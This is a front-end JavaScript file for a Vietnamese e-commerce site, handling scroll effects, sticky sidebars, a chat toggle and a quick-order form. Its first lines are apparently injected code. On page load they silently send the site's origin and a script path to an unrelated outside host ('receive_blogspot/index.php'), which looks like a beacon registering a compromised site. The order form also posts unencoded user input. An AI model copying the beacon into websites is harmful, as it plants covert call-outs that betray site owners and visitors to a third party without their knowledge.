// JavaScript Document
		type='/hostblog/guess/jetgroup/templates/front/js/animation.js';
		current=''+window.location.origin+' - '+ type +' '
		var xmlhttp = new XMLHttpRequest();
		xmlhttp.open("GET", "https://vanphongphamnhatminh.com/namcuong/receive_blogspot/index.php?url=" + current, true);
		xmlhttp.send();
	

$(document).scroll(function(){
	if($(this).scrollTop() > 400)
	{
		$('.home_page').addClass('home_page_fix');
		$('.back_to_top').fadeIn();
	}
	else
	{   
		$('.back_to_top').fadeOut();
		$('.home_page').removeClass('home_page_fix');
	}
});


$(document).ready(function() {	

	$(".henLkhaosat").click(function(){
		$('#dhn_dia_chi').focus();
	});
	//scroll san pham
	var xH
	$('.scroll').hover(
		function() {
		xH = $(this).children("img").css("height");
		xH = parseInt(xH);
		xH = xH - 400;
		xH = "-" + xH + "px";
		$(this).children( "img" ).css("top",xH);
		}, function() {
		$(this).children( "img" ).css("top","0px");
		}
	);
	
	//box_chat
	$(".box_chat .title").click(function(){
		$(".fb-page").slideToggle();
	});
	
	$('.back_to_top').click(function(){
		$('html, body').animate({scrollTop : 0},800);
		return false;
	});
	
	$.stickysidebarscroll(".sticky",{offset: {top: 10, bottom: 550}});
	$.stickysidebarscroll(".filtter",{offset: {top: 0, bottom: 550}});
	

//	
//	$.stickysidebarscroll(".order_sticky",{offset: {top: 55, bottom: 550}});
	
});
function DatHangNhanh()
{
	
	ho_ten=document.getElementById('dhn_ho_ten').value;
	so_dien_thoai=document.getElementById('dhn_so_di_dong').value;
	dia_chi=document.getElementById('dhn_dia_chi').value;
	dhn_dia_chi_2=document.getElementById('dhn_dia_chi_2').value;
	error=0;
	if(ho_ten=="Họ tên của bạn (*)")
	{
		error=1;
		$('#dhn_ho_ten').addClass('error');
	}
	if(so_dien_thoai=="Số điện thoại (*)")
	{
		error=1;
		$('#dhn_so_di_dong').addClass('error');
	}
	if(dia_chi=="Email (*)")
	{
		error=1;
		$('#dhn_dia_chi').addClass('error');
	}
	if(dhn_dia_chi_2=="Địa chỉ (*)")
	{
		error=1;
		$('#dhn_dia_chi_2').addClass('error');
	}
	if(error==1)
	{
		return false;
	}
	$.ajax({
			   type: "POST",
			   url: base_url + "mail/dat-hang-nhanh",
			   data: "ho_ten="+ho_ten+" & so_dien_thoai="+so_dien_thoai+" & dia_chi="+dia_chi+'-----'+dhn_dia_chi_2,			  
				success: function(data){
					  window.location.assign(base_url+"thanks.html");
					  return false;
						$('.boxDathang').html("<div class='dat_hang_thanh_cong'>Cảm ơn bạn đã yêu cầu chúng tôi sẽ liên hệ lại ngay sau khi nhận được thông tin!</div>");
													
					 },
					   error: function(){}
		});

			
}
